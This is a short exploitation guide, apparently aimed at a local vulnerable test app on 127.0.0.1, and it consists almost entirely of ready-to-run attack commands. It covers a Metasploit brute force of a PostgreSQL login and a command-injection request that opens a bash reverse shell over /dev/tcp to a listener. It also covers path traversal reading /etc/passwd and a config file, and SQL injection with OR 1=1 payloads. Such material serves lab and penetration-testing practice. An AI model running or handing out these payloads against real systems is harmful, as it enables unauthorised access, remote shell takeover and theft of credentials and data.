# Exploitation

## Exploitation 1: PostgreSQL Login Brute Force

```bash
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 127.0.0.1
set USERNAME vuln_user
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
set VERBOSE false
run
```

---

## Exploitation 2: Command Injection → Reverse Shell

**Terminal 1 (Metasploit listener):**
```bash
use multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

**Terminal 2 (trigger):**
```bash
curl "http://127.0.0.1:3000/cmd?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/127.0.0.1/4444%200>%261'"
```

---

## Exploitation 3: Path Traversal (Sensitive File Read)

```bash
use auxiliary/scanner/http/http_traversal
set RHOSTS 127.0.0.1
set RPORT 3000
set PATH /download?file=
run
```

**Manual verify:**
```bash
curl "http://127.0.0.1:3000/download?file=../../../etc/passwd"
curl "http://127.0.0.1:3000/download?file=config.txt"
```

---

## Exploitation 4: SQL Injection via Metasploit

```bash
use auxiliary/scanner/http/blind_sql_query
set RHOSTS 127.0.0.1
set RPORT 3000
set TARGETURI /users?id=1
set METHOD GET
run
```

**Manual verify:**
```bash
curl "http://127.0.0.1:3000/users?id=1 OR 1=1--"
curl "http://127.0.0.1:3000/users?id=999 or 1=1"
```

---
